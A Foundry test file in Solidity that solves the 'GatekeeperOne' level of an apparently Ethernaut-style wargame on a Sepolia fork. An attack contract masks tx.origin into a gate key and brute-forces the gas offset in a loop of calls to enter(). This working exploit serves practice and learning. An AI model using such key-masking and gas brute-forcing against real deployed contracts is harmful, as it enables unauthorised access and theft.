// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/13-GatekeeperOne/GatekeeperOne.sol";

contract ContractTest is Test {
    GateKeeperAttack GateKeeperAttackContract;
    GatekeeperOne level13 = GatekeeperOne(payable(0x96794e22eBB21d0269739828Eab4Dbc53CdF327a));

    function setUp() public {
    //Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));
    GateKeeperAttackContract = new GateKeeperAttack();
    }

    function testExploit13() public {
      GateKeeperAttackContract.Attack(); //foundry shouble set tx.origin to different address. it will not revert.

    }
  receive() external payable {}
}


contract GateKeeperAttack{

    GatekeeperOne level13 = GatekeeperOne(payable(0x96794e22eBB21d0269739828Eab4Dbc53CdF327a));

    function Attack() public {
        bytes8 _gateKey =  bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(level13).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}